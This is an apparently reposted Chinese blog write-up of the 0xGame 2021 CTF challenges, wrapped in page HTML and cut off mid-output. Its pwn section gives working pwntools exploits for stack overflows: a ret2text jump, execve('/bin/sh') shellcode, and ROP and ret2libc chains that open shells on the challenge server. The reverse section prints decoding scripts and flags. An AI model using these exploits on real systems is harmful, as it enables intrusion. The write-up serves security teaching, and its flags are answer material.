@@ -1,0 +1,1236 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Nctf迎新赛第一周, 十二惊惶">
+    <meta name="description" content="# 0xGame 2021 WriteUp 1（转载）
+[toc]
+# Pwn
+# Pwn？！
+附件给的其实有点多余，我给的目的是让大家知道 pwn 的最终目的就是执行 system (&amp;quot;/bin/sh&amp;quot;)
+直接 nc ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Nctf迎新赛第一周 | 十二惊惶</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="十二惊惶" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/1.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">十二惊惶</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/1.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">十二惊惶</div>
+        <div class="logo-desc">
+            
+            犁牛之子骍且角，虽欲勿用，山川其舍诸
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://gitee.com/Im-so-scared-2/shier_jinghuang" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>十二惊惶
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://gitee.com/Im-so-scared-2/shier_jinghuang" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="十二惊惶" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Nctf迎新赛第一周</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                                <span class="chip bg-color">解题记录</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-10-11
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-10-12
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    22 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="0xgame-2021-writeup-1转载"><a class="markdownIt-Anchor" href="#0xgame-2021-writeup-1转载">#</a> 0xGame 2021 WriteUp 1（转载）</h1>
+<p>[toc]</p>
+<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h2>
+<h3 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2">#</a> Pwn？！</h3>
+<p>附件给的其实有点多余，我给的目的是让大家知道 pwn 的最终目的就是执行 system (&quot;/bin/sh&quot;)</p>
+<p>直接 nc 连接上之后 cat flag 打开 flag 文件即可</p>
+<h3 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text">#</a> ret2text</h3>
+<p>我已经给了后门函数地址在 0x40115b</p>
+<p>有一个明显的栈溢出</p>
+<p>ida 里面显示距离 rbp-0x50</p>
+<p>那么就直接覆盖 0x50 个字节填充以及 0x8 个字节覆盖 rbp 即可劫持到 ret 地址</p>
+<p>直接覆盖成后门函数即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=remote(<span class="string">&#x27;121.4.15.155&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./main&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x40115b</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="wtfshellcode"><a class="markdownIt-Anchor" href="#wtfshellcode">#</a> WTF？Shellcode！</h3>
+<p>这个题其实就是想让大家了解什么是 shellcode</p>
+<p>也就是直接执行机器码</p>
+<p>通过上网查找或者让 pwntools 自己生成的方法找到一段 shellcode 即可</p>
+<p>注意 shellcode 的编写需要熟练的汇编理解，而且日后会经常写一些复杂的 shellcode</p>
+<p>注意到执行的是 buf+0x20 而不是 buf 本身</p>
+<p>所以填充 0x20 个字节再放置 shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.send(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="no-backdoor"><a class="markdownIt-Anchor" href="#no-backdoor">#</a> No BackDoor!</h3>
+<p>这题需要了解 linux 下寄存器传递参数的顺序</p>
+<p>rdi rsi rdx rcx r8 r9 栈</p>
+<p>既然存在 system 函数，而且查找存在 /bin/sh 字符串</p>
+<p>直接控制 rdi 位 /bin/sh 字符串地址，在调用 system 函数</p>
+<p>就相当于执行了 system (&quot;/bin/sh&quot;)</p>
+<p>而控制 rdi 用的是 pop rdi ; ret ;</p>
+<p>这样直接把字符串地址布置在栈上</p>
+<p>通过 pop 即控制了 rdi 参数</p>
+<p>(注意到这里有点小问题，就是直接执行会报错，详情可以参考 http://blog.eonew.cn/archives/958</p>
+<p>需要 ret 一次来调整栈帧)(当然也可以直接当下一题做)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401223</span></span><br><span class="line">bin_sh=<span class="number">0x404040</span></span><br><span class="line">system=<span class="number">0x401040</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi+<span class="number">1</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ret2libc-pro-max"><a class="markdownIt-Anchor" href="#ret2libc-pro-max">#</a> ret2libc pro max</h3>
+<p>模板题，ctfwiki 上讲的非常详细</p>
+<p>建议遇上相似题目直接套模板</p>
+<p>libc 版本为 2.23-ubuntu11.2_amd64</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=remote(<span class="string">&#x27;121.4.15.155&#x27;</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./main&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401223</span></span><br><span class="line">puts_plt=<span class="number">0x401030</span></span><br><span class="line">puts_got=<span class="number">0x404018</span></span><br><span class="line">start=<span class="number">0x401060</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start))</span><br><span class="line"></span><br><span class="line">libc_base=u64(r.recvline()[:-<span class="number">1</span>]+p16(<span class="number">0</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="number">0x18ce17</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh)+p64(system))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse">#</a> Reverse</h2>
+<h3 id="signin-user-friendly"><a class="markdownIt-Anchor" href="#signin-user-friendly">#</a> Signin: User Friendly</h3>
+<p>IDA 打开软件 直接按  <code>f5</code>  或者  <code>shift</code>  +  <code>f12</code>  查看字符串，即可看到 flag</p>
+<p>有人可能会想知道，每次生成的随机数是多少。实际上我也不知道。因为每次程序运行使用的随机种子都不同，所以生成的随机数也不同。如果想知道生成的随机数是多少，可以自行动态调试获知，再输入程序获取 flag</p>
+<h3 id="packet"><a class="markdownIt-Anchor" href="#packet">#</a> Packet</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/upx/upx" title="UPX链接">UPX github 链接</a></p>
+<p>脱壳命令  <code>upx -d test.exe</code></p>
+<p>这里还需要知道一下  <code>(a&amp;~b | b&amp;~a) == a ^ b</code>  这两个运算相等</p>
+<p>解题脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">161</span>, <span class="number">15</span>, <span class="number">188</span>, <span class="number">111</span>, <span class="number">218</span>, <span class="number">169</span>, <span class="number">159</span>, <span class="number">94</span>, <span class="number">41</span>, <span class="number">246</span>, <span class="number">197</span>, <span class="number">228</span>, <span class="number">110</span>, <span class="number">242</span>, <span class="number">177</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">256</span>, <span class="number">256</span>, <span class="number">50</span>, <span class="number">233</span>, <span class="number">65</span>, <span class="number">104</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">42</span>, <span class="number">112</span>, <span class="number">55</span>, <span class="number">107</span>, <span class="number">48</span>, <span class="number">93</span>, <span class="number">130</span>, <span class="number">232</span>, <span class="number">37</span>, <span class="number">87</span>, <span class="number">242</span>, <span class="number">130</span>]</span><br><span class="line">enc = [<span class="number">145</span>, <span class="number">119</span>, <span class="number">251</span>, <span class="number">14</span>, <span class="number">183</span>, <span class="number">204</span>, <span class="number">228</span>, <span class="number">56</span>, <span class="number">17</span>, <span class="number">148</span>, <span class="number">253</span>,<span class="number">133</span>, <span class="number">92</span>, <span class="number">145</span>, <span class="number">132</span>, <span class="number">92</span>, <span class="number">125</span>, <span class="number">103</span>, <span class="number">39</span>, <span class="number">308</span>, <span class="number">309</span>, <span class="number">10</span>, <span class="number">216</span>, <span class="number">35</span>, <span class="number">13</span>, <span class="number">48</span>, <span class="number">101</span>, <span class="number">62</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">84</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">62</span>, <span class="number">176</span>, <span class="number">217</span>, <span class="number">19</span>, <span class="number">51</span>, <span class="number">195</span>, <span class="number">255</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(arr[i] ^ enc[i]), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 0xGame&#123;f8b8a2c5dff64581be2a895c9ac216d1&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="our-compilation-story"><a class="markdownIt-Anchor" href="#our-compilation-story">#</a> Our Compilation Story</h3>
+<p>简单 python 代码，读懂就可以做</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">21</span>,<span class="number">44</span>,<span class="number">45</span>,<span class="number">104</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">26</span>,<span class="number">121</span>,<span class="number">65</span>,<span class="number">125</span>,<span class="number">23</span>,<span class="number">112</span>,<span class="number">77</span>,<span class="number">46</span>,<span class="number">47</span>,<span class="number">126</span>,<span class="number">89</span>,<span class="number">112</span>,<span class="number">7</span>,<span class="number">109</span>,<span class="number">7</span>,<span class="number">88</span>,<span class="number">10</span>,<span class="number">105</span>,<span class="number">104</span>,<span class="number">59</span>,<span class="number">54</span>,<span class="number">91</span>,<span class="number">83</span>,<span class="number">98</span>,<span class="number">32</span>,<span class="number">54</span>,<span class="number">15</span>,<span class="number">65</span>,<span class="number">113</span>,<span class="number">119</span>,<span class="number">113</span>]</span><br><span class="line">arr = arr[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(arr) - <span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(arr[i] ^ arr[i + <span class="number">3</span>]), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 0xGame&#123;Th3_10ng_w4y_w3_901ng_fr33&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="random-chaos"><a class="markdownIt-Anchor" href="#random-chaos">#</a> Random Chaos</h3>
+<p>C 语言  <code>rand</code>  函数生成的随机数是伪随机数，本质是一个线性同余发生器，在随机种子给定的情况下每次生成的随机数序列相同，所以直接异或就可以</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[<span class="number">41</span>] = &#123;<span class="number">0x22</span>, <span class="number">0xca</span>, <span class="number">0x7</span>, <span class="number">0x19</span>, <span class="number">0xf8</span>, <span class="number">0xfb</span>, <span class="number">0x28</span>, <span class="number">0x9d</span>, <span class="number">0x1e</span>, <span class="number">0x80</span>, <span class="number">0xac</span>, <span class="number">0xc9</span>, <span class="number">0x60</span>, <span class="number">0x46</span>, <span class="number">0x18</span>, <span class="number">0x21</span>, <span class="number">0xdf</span>, <span class="number">0x95</span>, <span class="number">0xd5</span>, <span class="number">0x70</span>, <span class="number">0xc5</span>, <span class="number">0x19</span>, <span class="number">0xea</span>, <span class="number">0xb0</span>, <span class="number">0x9c</span>, <span class="number">0x83</span>, <span class="number">0x11</span>, <span class="number">0x4a</span>, <span class="number">0x93</span>, <span class="number">0xc7</span>, <span class="number">0x91</span>, <span class="number">0xf6</span>, <span class="number">0x14</span>, <span class="number">0x71</span>, <span class="number">0x2f</span>, <span class="number">0x22</span>, <span class="number">0x14</span>, <span class="number">0xbf</span>, <span class="number">0x58</span>, <span class="number">0x76</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand(<span class="number">0x2021</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(enc[i] ^ (rand() &amp; <span class="number">0xff</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0xGame&#123;d6ca93397ecb4d4e83792a7100737932&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="neverland"><a class="markdownIt-Anchor" href="#neverland">#</a> Neverland</h3>
+<p>递归深度比较小的时候，递归求解还能出结果</p>
+<p>当递归深度非常大时候，时间不够求解出结果，所以 flag 只能输出一半</p>
+<p>可以看一下文章按照优化斐波那契数列的方法优化一下 func 函数 (<em>比如将递归转换为一个循环函数进行计算，虽然也慢，但与递归相比是非常的快了</em>)，就能输出正确结果</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41035588/article/details/81814547," title="斐波那契数列优化">【C 语言】斐波那契数列四种优化求解</a></p>
+<p><strong>当然不看以上方法也可以</strong>，我们知道  <code>int</code>  型数据储存数据有范围限制，而且可以知道这个数列在不断增大，所以  <code>func</code>  函数每次返回的数据，相当于数列中对应数据的值对 0x10000000 取模</p>
+<p>斐波那契数列对某一个数取模会出现循环节，这个数列也同样如此，我们将 <code>func</code>  函数写一遍，按顺序输出一些数就可以发现规律了</p>
+<p>测试代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">7</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">3</span> * func(n-<span class="number">1</span>) + <span class="number">4</span> * func(n-<span class="number">2</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,<span class="string">&quot;:&quot;</span>,func(i))</span><br></pre></td></tr></table></figure>
+<p>输出结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0 : 7</span><br><span class="line">1 : 8</span><br><span class="line">2 : 52</span><br><span class="line">3 : 188</span><br><span class="line">4 : 772</span><br><span class="line">5 : 3068</span><br><span class="line">6 : 12292</span><br><span class="line">7 : 49148</span><br><span class="line">8 : 196612</span><br><span class="line">9 : 